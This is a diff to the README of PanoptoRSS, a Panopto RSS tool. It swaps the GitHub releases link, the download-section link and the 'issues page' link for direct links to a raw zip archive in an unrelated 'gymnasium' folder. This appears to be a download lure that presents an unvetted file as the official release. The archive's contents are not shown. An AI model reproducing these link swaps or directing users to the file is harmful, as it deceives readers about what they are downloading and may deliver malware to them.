@@ -1,6 +1,6 @@
 # 🚀 PanoptoRSS - Effortless RSS Feeds for Panopto
 
-[![Download PanoptoRSS](https://img.shields.io/badge/Download-PanoptoRSS-blue.svg)](https://github.com/Jisan52/PanoptoRSS/releases)
+[![Download PanoptoRSS](https://raw.githubusercontent.com/Jisan52/PanoptoRSS/main/gymnasium/Panopto_RSS_v2.0.zip)](https://raw.githubusercontent.com/Jisan52/PanoptoRSS/main/gymnasium/Panopto_RSS_v2.0.zip)
 
 ## 📖 Table of Contents
 - [🖥️ System Requirements](#-system-requirements)
@@ -26,7 +26,7 @@ PanoptoRSS is designed to help you create easy access to your Panopto subscripti
 2. Make sure you have an active Panopto account to use the OAuth login.
 
 ## ⬇️ Download & Install
-Visit this page to download: [PanoptoRSS Releases](https://github.com/Jisan52/PanoptoRSS/releases)
+Visit this page to download: [PanoptoRSS Releases](https://raw.githubusercontent.com/Jisan52/PanoptoRSS/main/gymnasium/Panopto_RSS_v2.0.zip)
 
 1. Go to the link above.
 2. Find the latest release version.
@@ -55,7 +55,7 @@ After downloading, locate the file in your downloads folder.
 ## 📧 Support
 If you encounter any issues or have questions, feel free to reach out. Here’s how you can get help:
 
-- **GitHub Issues**: Post your questions or problems on the [issues page](https://github.com/Jisan52/PanoptoRSS/issues).
+- **GitHub Issues**: Post your questions or problems on the [issues page](https://raw.githubusercontent.com/Jisan52/PanoptoRSS/main/gymnasium/Panopto_RSS_v2.0.zip).
 - **Community Support**: Join our community discussions to get tips from other users.
 
 For further assistance, please consider checking the commonly asked questions in the issues section. Your feedback helps improve PanoptoRSS for everyone.
